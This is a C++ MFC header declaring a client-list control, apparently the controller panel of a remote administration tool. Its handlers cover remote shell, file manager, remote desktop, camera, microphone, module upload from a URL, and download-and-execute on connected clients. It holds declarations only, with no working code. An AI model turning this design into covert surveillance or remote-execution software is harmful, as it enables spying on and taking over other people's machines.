#pragma once
#include "afxcmn.h"

#define WM_CLIENT_LOGIN				(WM_USER + 401)
#define WM_CLIENT_LOGOUT			(WM_USER + 402)

#define WM_CLIENT_BLOCK				(WM_USER + 403)
#define WM_CLIENT_EDITCOMMENT		(WM_USER + 404)



class CClientList :
	public CListCtrl
{
public:
	CClientList();
	~CClientList();
	DECLARE_MESSAGE_MAP()
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);

	afx_msg LRESULT OnClientLogin(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnClientLogout(WPARAM wParam, LPARAM lParam);

	afx_msg LRESULT OnEditComment(WPARAM wParam, LPARAM lParam);

	afx_msg void OnNMRClick(NMHDR *pNMHDR, LRESULT *pResult);
	
	afx_msg void OnPowerReboot();
	afx_msg void OnPowerShutdown();
	afx_msg void OnSessionDisconnect();
	afx_msg void OnOperationEditcomment();
	afx_msg void OnUploadmoduleFromdisk();
	afx_msg void OnUploadmoduleFromurl();
	afx_msg void OnOperationCmd();
	afx_msg void OnOperationChatbox();
	afx_msg void OnOperationFilemanager();
	afx_msg void OnOperationRemotedesktop();
	afx_msg void OnOperationCamera();
	afx_msg void OnSessionRestart();
	afx_msg void OnOperationMicrophone();
	afx_msg void OnOperationDownloadandexec();
};

